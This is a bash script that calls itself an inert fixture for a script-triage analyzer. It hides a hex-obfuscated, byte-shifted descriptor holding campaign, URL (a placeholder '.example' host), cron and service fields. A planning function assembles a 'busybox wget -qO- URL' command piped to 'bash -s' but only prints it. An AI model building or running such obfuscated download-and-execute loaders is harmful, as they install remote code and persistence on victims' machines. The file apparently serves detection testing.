#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_85499b7a='571e125d54554651541e424452564a53464053464e5055460d454a54514255444940514a51465d424542515546531e4356545a4350594058484655405455455056555d5455424846404450564f551e125d44424e51424a484f404a451e44424e51424a484f0e471712461a43434445165d56534d1e49555551541b1010471712461a43434445160f4659424e514d460f4a4f57424d4a45101a164617194614170f54495d56544653404248464f551e29564f55534654542d424310471712461a4343444516'
  readonly Codec_85499b7a='hex_compact|subtract_modulo_256|1f'

  Load_85499b7a() {
    EnCoDeD_Bytes=()
    local raw="${Material_85499b7a}" InDeX
    for ((InDeX=0; InDeX<${#raw}; InDeX+=2)); do EnCoDeD_Bytes+=("$((16#${raw:InDeX:2}))"); done
  }

  Decode_85499b7a() {
    DeCoDeD_Bytes=()
    local InDeX
    for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
      DeCoDeD_Bytes+=("$(((EnCoDeD_Bytes[InDeX] + 31) % 256))")
    done
  }

  Recover_85499b7a() {
    local -a EnCoDeD_Bytes DeCoDeD_Bytes
    local DeScRiPtOr_Text NeUtRaL PaSs InDeX
    local -a compass=(north south); NeUtRaL="$(IFS=:; printf '%s' "${compass[*]}")"
    Load_85499b7a
    case 1 in 1) Decode_85499b7a ;; *) return 70 ;; esac
    DeScRiPtOr_Text=''
    local octal character
    for InDeX in "${!DeCoDeD_Bytes[@]}"; do
      printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
      printf -v character '%b' "\\$octal"
      DeScRiPtOr_Text+="$character"
    done
    printf '%s\n' "$DeScRiPtOr_Text"
  }

  Inspect_85499b7a() { local recovered field; local -a fields; recovered="$(Recover_85499b7a)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_85499b7a() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_85499b7a)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(busybox wget -qO- "$url")
    local -a interpreter=(bash -s)
    declare -p request_command interpreter
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_85499b7a; fi
